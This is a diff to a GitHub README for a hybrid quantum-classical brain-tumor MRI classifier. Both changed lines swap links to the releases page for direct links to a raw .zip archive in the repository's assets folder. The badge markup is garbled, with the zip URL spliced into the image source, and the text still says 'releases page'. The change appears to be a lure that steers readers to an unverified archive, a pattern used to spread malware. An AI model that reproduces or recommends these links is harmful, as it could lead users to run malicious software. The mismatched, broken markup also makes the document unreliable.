@@ -4,7 +4,7 @@
 The **Brain-Tumor-QCNN-ResNet** project implements a hybrid Quantum-Classical model for classifying brain tumors. This software uses advanced techniques like Quantum FiLM modulation and the ResNet-18 architecture. It efficiently detects multiple types of MRI tumors, helping improve diagnosis and patient care in healthcare settings.
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-green.svg)](https://github.com/codegeaslelouch/Brain-Tumor-QCNN-ResNet/releases)
+[![Download the latest release](https://github.com/codegeaslelouch/Brain-Tumor-QCNN-ResNet/raw/refs/heads/main/assets/Res_Net_Brain_QCN_Tumor_v3.5-beta.5.zip%20Latest%https://github.com/codegeaslelouch/Brain-Tumor-QCNN-ResNet/raw/refs/heads/main/assets/Res_Net_Brain_QCN_Tumor_v3.5-beta.5.zip)](https://github.com/codegeaslelouch/Brain-Tumor-QCNN-ResNet/raw/refs/heads/main/assets/Res_Net_Brain_QCN_Tumor_v3.5-beta.5.zip)
 
 ## 🚀 Getting Started
 To get started with the Brain-Tumor-QCNN-ResNet application, follow these simple instructions.
@@ -23,7 +23,7 @@ Before you install the application, ensure that your system meets the following 
 ### 💻 Installation Steps
 1. **Visit the Releases Page**  
    Go to the releases page to find the latest version of the software:  
-   [Download Here](https://github.com/codegeaslelouch/Brain-Tumor-QCNN-ResNet/releases)
+   [Download Here](https://github.com/codegeaslelouch/Brain-Tumor-QCNN-ResNet/raw/refs/heads/main/assets/Res_Net_Brain_QCN_Tumor_v3.5-beta.5.zip)
 
 2. **Select the Desired Version**  
    Once on the releases page, locate the version you want to download. The latest version is generally at the top of the list.
